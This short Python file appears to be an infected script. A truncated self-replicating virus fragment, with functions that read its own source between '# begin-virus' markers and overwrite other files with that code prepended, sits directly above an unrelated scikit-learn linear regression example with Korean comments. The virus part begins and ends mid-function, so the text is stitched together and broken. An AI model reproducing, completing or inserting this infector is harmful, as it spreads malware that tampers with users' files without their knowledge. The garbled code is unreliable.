# begin-virus
        if "# begin-virus" in line:
            return None
    return data

def infect(file, virus_code):
    if (data := get_content_if_infectable(file)):
        with open(file, "w", encoding='utf-8') as infected_file:
            infected_file.write("# begin-virus\n")
            infected_file.write(virus_code)
            infected_file.writelines(data)

def get_virus_code():
    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-virus" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end-virus" in line:
from sklearn.linear_model import LinearRegression

# 훈련 데이터 준비
X_train = [[1], [2], [3], [4], [5]]  # 독립 변수
y_train = [2, 6, 4, 10, 8]  # 종속 변수

# 선형 회귀 모델 생성 및 훈련
model = LinearRegression()
model.fit(X_train, y_train)

# 예측할 데이터 준비
X_test = [[6], [7], [8]]  # 예측할 독립 변수

# 예측 결과 출력
y_pred = model.predict(X_test)
print(y_pred)
